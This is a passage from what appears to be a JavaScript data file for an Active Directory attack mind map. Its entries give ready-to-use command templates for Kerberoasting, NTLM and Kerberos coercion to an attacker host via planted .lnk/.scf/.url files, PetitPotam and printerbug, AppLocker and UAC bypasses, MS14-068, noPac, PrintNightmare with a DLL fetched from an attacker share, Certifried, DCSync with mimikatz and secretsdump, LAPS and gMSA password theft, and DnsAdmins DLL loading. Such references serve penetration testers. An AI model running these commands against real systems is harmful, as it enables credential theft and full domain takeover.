          outcomes: [{ label: "ADCS Exploitation", color: "#c084fc" }],
          moveTo: []
        },
        {
          id: "vc-enum-sccm",
          title: "Enumerate SCCM",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Locate SCCM/MECM site systems and management points for later abuse.",
          cmds: [
            "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
            "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
            "SharpSCCM.exe local site-info"
          ],
          outcomes: [{ label: "SCCM Exploitation", color: "#86efac" }],
          moveTo: []
        },
        {
          id: "vc-scan-auto",
          title: "Scan Auto",
          theory: null,
          cve: null,
          desc: "Run automated review tools to surface attack paths and misconfigurations.",
          cmds: [
            "AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>",
            "PingCastle.exe --healthcheck --server <domain>",
            "Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "vc-kerberoasting",
          title: "Kerberoasting",
          theory: { label: "Kerberoasting", url: "theory/2026-08-18-kerberoasting.html" },
          cve: null,
          desc: "Request service tickets for SPN accounts and crack them offline. Exclude machine and (g)MSA accounts.",
          cmds: [
            "MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u",
            "GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>",
            "Rubeus.exe kerberoast"
          ],
          outcomes: [{ label: "Hash TGS", color: "#e8912e" }],
          moveTo: [{ section: "crack-hash", label: "Crack hash", note: "crack the TGS offline to recover the service account password" }]
        },
        {
          id: "vc-drop-file",
          title: "Drop file (forced authentication)",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Plant files on writable shares that trigger authentication to your host when a user browses the folder.",
          cmds: [],
          branches: [
            { label: ".lnk", cmds: ["nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>"] },
            { label: ".scf", cmds: ["nxc smb <dc_ip> -u '<user>' -p '<password>' -M scuffy -o NAME=<filename> SERVER=<attacker_ip>"] },
            { label: ".url", cmds: ["[InternetShortcut]... IconFile=\\\\<attacker_ip>\\%USERNAME%.icon"] },
            { label: "Other files", cmds: ["ntlm_theft.py -g all -s <your_ip> -f test"] }
          ],
          outcomes: [{ label: "SMB NTLM Coerce", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "capture or relay the forced authentication" }]
        },
        {
          id: "vc-webdav",
          title: "WebDAV (HTTP coercion)",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Force HTTP authentication (relayable cross-protocol) by enabling WebClient and coercing to your host.",
          cmds: [],
          branches: [
            { label: "Enable WebClient", cmds: [".searchConnector-ms", "nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc"] },
            { label: "Add attacker computer in DNS", cmds: ["dnstool.py -u <domain>\\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>"] },
            { label: "Launch coerce with <attacker_hostname>@80/x as target", outcomes: [{ label: "HTTP Coerce", color: "#ffe14a" }] }
          ],
          outcomes: [],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the coerced HTTP authentication to LDAP(S)/AD CS" }]
        },
        {
          id: "vc-rpc-coerce",
          title: "RPC call (NTLM coercion)",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Coerce a host (often a DC) over MS-RPRN / MS-EFSR to authenticate to your listener.",
          cmds: [
            "printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>",
            "petitpotam.py -d <domain> -u <user> -p <password> <listener_ip> <target_ip>",
            "coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>"
          ],
          outcomes: [{ label: "SMB NTLM Coerce", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the coerced SMB authentication" }]
        },
        {
          id: "vc-coerce-kerberos",
          title: "Coerce Kerberos",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Add a DNS record for an attacker hostname encoding a Kerberos SPN, then coerce Kerberos authentication to it.",
          cmds: [
            "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -d \"<attacker_ip>\" --action add \"<dns_server_ip>\" -r \"<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp",
            "petitpotam.py -u '<user>' -p '<password>' -d <domain> <servername>1UWh... <target>"
          ],
          outcomes: [{ label: "SMB Kerberos Coerce", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Kerberos relay", note: "relay the coerced Kerberos authentication" }]
        },
        {
          id: "vc-intra-id",
          title: "Intra ID Connect (find MSOL)",
          theory: null,
          cve: null,
          desc: "Locate the Entra/Azure AD Connect sync (MSOL) account, whose credentials are often recoverable and highly privileged.",
          cmds: [
            "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users | grep -i MSOL"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "vc-can-connect",
          title: "Can connect to a computer",
          theory: null,
          cve: null,
          desc: "Your credential grants a session on a host — move laterally and continue from there.",
          cmds: [],
          outcomes: [{ label: "Lateral move", color: "#9ca3af" }],
          moveTo: [{ section: "low-access", label: "Privilege escalation", note: "once on the host, escalate locally" }]
        },
        {
          id: "vc-exploit",
          title: "Exploit",
          theory: null,
          cve: null,
          desc: "Known authenticated vulnerabilities may apply to this domain.",
          cmds: [],
          outcomes: [],
          moveTo: [{ section: "known-vulns-auth", label: "Known vulnerabilities (authenticated)", note: "try the authenticated CVEs" }]
        }
      ]
    },

    {
      id: "low-access",
      title: "Low access (Privilege escalation)",
      color: "#c9c1e8",
      tag: "Local privesc",
      desc: "You have a foothold on a host as a low-privileged user. Escalate to local admin / SYSTEM through misconfigurations, bypasses, and impersonation.",
      techniques: [
        {
          id: "la-bypass-applocker",
          title: "Bypass AppLocker",
          theory: null,
          cve: null,
          desc: "Enumerate AppLocker rules and abuse writable paths or trusted LOLBins to run code.",
          cmds: [],
          branches: [
            { label: "Get AppLocker info", cmds: ["Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)"] },
            { label: "Files in writable paths", cmds: ["C:\\Windows\\Temp", "C:\\Windows\\Tasks"] },
            { label: "LOLBin execution", cmds: [
              "installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe",
              "mshta.exe my.hta",
              "MsBuild.exe pshell.xml"
            ] }
          ],
          outcomes: [{ label: "Low access (without AppLocker)", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "la-uac-bypass",
          title: "UAC bypass",
          theory: null,
          cve: null,
          desc: "Abuse auto-elevating binaries to run code at high integrity.",
          cmds: [
            "Fodhelper.exe",
            "wsreset.exe",
            "msdt.exe"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "la-auto-enum",
          title: "Auto enum",
          theory: null,
          cve: null,
          desc: "Run automated privilege-escalation checks.",
          cmds: [
            "winPEASany_ofs.exe",
            ".\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "la-search-files",
          title: "Search files",
          theory: null,
          cve: null,
          desc: "Grep the filesystem for stored passwords in scripts, configs, and documents.",
          cmds: [
            "findstr /si 'pass' *.txt *.xml *.docx *.ini"
          ],
          outcomes: [{ label: "User Account", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "la-exploit",
          title: "Exploit",
          theory: null,
          cve: null,
          desc: "Local privilege-escalation vulnerabilities.",
          cmds: [],
          branches: [
            { label: "SMBGhost", cve: "CVE-2020-0796", note: "SMBv3 compression local privilege escalation." },
            { label: "HiveNightmare / SeriousSAM", cve: "CVE-2021-36934", cmds: ["vssadmin list shadows"] }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "la-webdav",
          title: "WebDAV (HTTP coercion)",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Trigger HTTP authentication from the host to your listener for relaying.",
          cmds: [
            "open file <file>.searchConnector-ms",
            "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>",
            "petitpotam.py -u '<user>' -p <pass> -d <domain> \"attacker@80/random.txt\" <ip>"
          ],
          outcomes: [{ label: "HTTP Coerce", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the coerced HTTP authentication" }]
        },
        {
          id: "la-kerberos-relay",
          title: "Kerberos Relay",
          theory: null,
          cve: null,
          desc: "Relay local Kerberos authentication to LDAP to configure RBCD on the machine account and gain SYSTEM.",
          cmds: [
            "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
            "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name> -cp <computer_pass>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "la-seimpersonate",
          title: "From service account (SeImpersonate)",
          theory: null,
          cve: null,
          desc: "A service account holding SeImpersonatePrivilege can be escalated to SYSTEM with a Potato technique.",
          cmds: [],
          branches: [
            { label: "RoguePotato" },
            { label: "GodPotato" },
            { label: "PrintSpoofer" },
            { label: "RemotePotato0" }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        }
      ]
    },

    {
      id: "known-vulns-auth",
      title: "Known vulnerabilities (authenticated)",
      color: "#f0c988",
      tag: "Authenticated CVEs",
      desc: "With a valid domain account, a set of well-known CVEs can escalate straight to Domain Admin. Scan first, then exploit what applies.",
      techniques: [
        {
          id: "kv-ms14-068",
          title: "MS14-068",
          theory: null,
          cve: { id: "MS14-068", label: "Kerberos PAC forgery" },
          desc: "Forge a PAC to grant yourself Domain Admin group membership in a Kerberos ticket.",
          cmds: [
            "findSMB2UPTime.py <ip>"
          ],
          branches: [
            { label: "Python", cmds: ["ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>"] },
            { label: "Metasploit", cmds: ["msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"] },
            { label: "goldenPac", cmds: ["goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target"] }
          ],
          outcomes: [{ label: "PTT", color: "#9ca3af" }, { label: "Domain admin", color: "#ef4444" }, { label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "kv-gpp",
          title: "GPP MS14-025",
          theory: null,
          cve: { id: "MS14-025", label: "Group Policy Preferences password" },
          desc: "Group Policy Preferences stored an AES-encrypted password with a published key. Anyone who can read SYSVOL can decrypt it.",
          cmds: [
            "msf> use auxiliary/scanner/smb/smb_enum_gpp",
            "findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml",
            "Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>"
          ],
          outcomes: [{ label: "Domain admin", color: "#ef4444" }],
          moveTo: []
        },
        {
          id: "kv-privexchange",
          title: "PrivExchange",
          theory: null,
          cve: { id: "CVE-2019-0724", label: "PrivExchange (also CVE-2019-0686)" },
          desc: "Exchange pushes authentication to your host, which you relay to LDAP to grant DCSync rights.",
          cmds: [
            "privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>"
          ],
          outcomes: [{ label: "HTTP Coerce", color: "#ffe14a" }, { label: "Domain admin", color: "#ef4444" }, { label: "Admin", color: "#f4b6b6" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the Exchange authentication to LDAP" }]
        },
        {
          id: "kv-nopac",
          title: "noPac (sAMAccountName spoofing)",
          theory: null,
          cve: { id: "CVE-2021-42287", label: "noPac (with CVE-2021-42278)" },
          desc: "Abuse sAMAccountName spoofing to impersonate a DC and obtain a privileged ticket.",
          cmds: [
            "nxc smb <ip> -u 'user' -p 'pass' -M nopac   # scan",
            "noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt"
          ],
          outcomes: [{ label: "PTT", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "Domain admin", color: "#ef4444" }],
          moveTo: []
        },
        {
          id: "kv-printnightmare",
          title: "PrintNightmare",
          theory: null,
          cve: { id: "CVE-2021-1675", label: "PrintNightmare (with CVE-2021-34527)" },
          desc: "Abuse the Print Spooler to load a malicious DLL and run code as SYSTEM.",
          cmds: [
            "nxc smb <ip> -u 'user' -p 'pass' -M printnightmare   # scan",
            "printnightmare.py -dll '\\\\<attacker_ip>\\smb\\add_user.dll' '<user>:<password>@<ip>'"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "kv-certifried",
          title: "Certifried",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: { id: "CVE-2022-26923", label: "Certifried" },
          desc: "Abuse a machine-account certificate request to impersonate a DC and DCSync.",
          cmds: [],
          branches: [
            { label: "Create account", cmds: ["certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc$' -pass 'certifriedpass' -dns '<fqdn_dc>'"] },
            { label: "Request", cmds: ["certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine"] },
            { label: "Authentication", cmds: ["certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>"] }
          ],
          outcomes: [{ label: "PTT", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "Domain admin", color: "#ef4444" }],
          moveTo: []
        },
        {
          id: "kv-proxynotshell",
          title: "ProxyNotShell",
          theory: null,
          cve: { id: "CVE-2022-41040", label: "ProxyNotShell (with CVE-2022-41082)" },
          desc: "Authenticated Exchange SSRF chained to PowerShell remoting for code execution.",
          cmds: [
            "poc_aug3.py <host> <username> <password> <command>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        }
      ]
    },

    {
      id: "acls-aces",
      title: "ACLs / ACEs permissions",
      color: "#2f6bed",
      tag: "Abuse rights",
      desc: "BloodHound has revealed abusable rights over objects. Each ACE type has a matching abuse — take ownership, add members, set shadow credentials, or DCSync.",
      techniques: [
        {
          id: "acl-dcsync",
          title: "DCSync",
          theory: null,
          cve: null,
          desc: "Replicate directory secrets. Granted to Administrators, Domain Admins, Enterprise Admins, and Domain Controller computer accounts — or anyone with the DS-Replication rights.",
          cmds: [
            "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
            "secretsdump.py '<domain>/<user>:<password>@<domain_controller>'"
          ],
          outcomes: [{ label: "Domain Admin", color: "#ef4444" }, { label: "Lateral move", color: "#9ca3af" }, { label: "Crack hash", color: "#e8912e" }],
          moveTo: [{ section: "crack-hash", label: "Crack hash", note: "crack the dumped hashes offline" }]
        },
        {
          id: "acl-shadow-creds",
          title: "Change msDS-KeyCredentialLink (GenericWrite) + ADCS",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: null,
          desc: "With write access to the target's Key Credentials and PKINIT available, add a shadow credential and authenticate as that object.",
          cmds: [
            "certipy shadow auto -u <user>@<domain> -p <password> -account <target_account>",
            "pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\""
          ],
          outcomes: [{ label: "PassTheCertificate", color: "#aebdd0" }],
          moveTo: []
        },
        {
          id: "acl-on-group",
          title: "On a Group",
          theory: null,
          cve: null,
          desc: "Rights over a group let you add yourself (or a controlled account) as a member.",
          cmds: [],
          branches: [
            { label: "GenericAll / GenericWrite / Self / AddExtended Rights", note: "Add a member to the group." },
            { label: "Write Owner", note: "Grant yourself ownership, then set rights." },
            { label: "WriteDACL + WriteOwner", note: "Grant rights, then give yourself GenericAll." }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-on-computer",
          title: "On a Computer",
          theory: null,
          cve: null,
          desc: "Rights over a computer object enable RBCD or shadow credentials for a takeover.",
          cmds: [],
          branches: [
            { label: "GenericAll / GenericWrite → msDS-AllowedToActOnBehalfOfOtherIdentity", outcomes: [{ label: "RBCD", color: "#12b886" }] },
            { label: "GenericAll / GenericWrite → add Key Credentials", outcomes: [{ label: "Shadow credentials", color: "#60b5ef" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-on-user",
          title: "On a User",
          theory: null,
          cve: null,
          desc: "Rights over a user account allow password reset, targeted Kerberoasting, shadow credentials, or logon-script abuse.",
          cmds: [],
          branches: [
            { label: "GenericAll / GenericWrite → Change password", cmds: ["net user <user> <password> /domain"], outcomes: [{ label: "User with clear text pass", color: "#4ade80" }] },
            { label: "GenericAll / GenericWrite → add SPN (targeted Kerberoasting)", cmds: ["targetedKerberoast.py -d <domain> -u <user> -p <pass>"], outcomes: [{ label: "Hash found (TGS)", color: "#e8912e" }] },
            { label: "GenericAll / GenericWrite → add Key Credentials", outcomes: [{ label: "Shadow credentials", color: "#60b5ef" }] },
            { label: "GenericAll / GenericWrite → login script", outcomes: [{ label: "Access", color: "#9ca3af" }] },
            { label: "ForceChangePassword", cmds: ["net user <user> <password> /domain"], outcomes: [{ label: "User with clear text pass", color: "#4ade80" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-on-ou",
          title: "On an OU",
          theory: null,
          cve: null,
          desc: "Rights over an organizational unit let you push inherited ACEs or abuse linked GPOs against every object inside.",
          cmds: [],
          branches: [
            { label: "WriteDacl → ACE Inheritance → Grant rights", note: "Push an inheritable ACE onto child objects." },
            { label: "GenericAll / GenericWrite / Manage Group Policy Links", cmds: ["OUned.py --config config.ini"] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-readgmsa",
          title: "ReadGMSAPassword",
          theory: null,
          cve: null,
          desc: "Read the managed password blob of a gMSA you are allowed to retrieve, and compute its NT hash.",
          cmds: [
            "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'",
            "nxc ldap <ip> -u <user> -p <pass> --gmsa",
            "ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-laps",
          title: "Get LAPS passwords",
          theory: null,
          cve: null,
          desc: "Principals allowed to read LAPS can recover the local administrator password of managed hosts.",
          cmds: [],
          branches: [
            { label: "Who can read LAPS", cmds: ["MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p"] },
            { label: "Read LAPS", cmds: [
              "Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps",
              "foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name | where {$objcomputer.name -ne $env:computername} | %{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}",
              "nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps",
              "msf> use post/windows/gather/credentials/enum_laps"
            ] }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "acl-gpo",
          title: "GPO",
          theory: null,
          cve: null,
          desc: "Write access to a GPO (or to a GP-Link on an OU) lets you push a malicious policy to every affected host or user.",
          cmds: [],
          branches: [
            { label: "Who can control GPOs", cmds: ["MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p"] },
            { label: "SID of principals that can create new GPOs in the domain", cmds: [
              'Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl'
            ] },
            { label: "Principals that can write to the GP-Link attribute on OUs", cmds: [
              'Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl'
            ] },
            { label: "Generic Write on GPO → Abuse GPO", outcomes: [{ label: "Access", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-dnsadmin",
          title: "DNS Admin",
          theory: null,
          cve: { id: "CVE-2021-40469", label: "DnsAdmins DLL injection" },
          desc: "A member of DnsAdmins can load an arbitrary DLL into the DNS service (running as SYSTEM on the DC) and restart it.",
          cmds: [
            "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll>   # needs a DnsAdmins user",
            "sc \\\\DNSServer stop dns && sc \\\\DNSServer start dns"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        }
      ]
    }
  ]
};
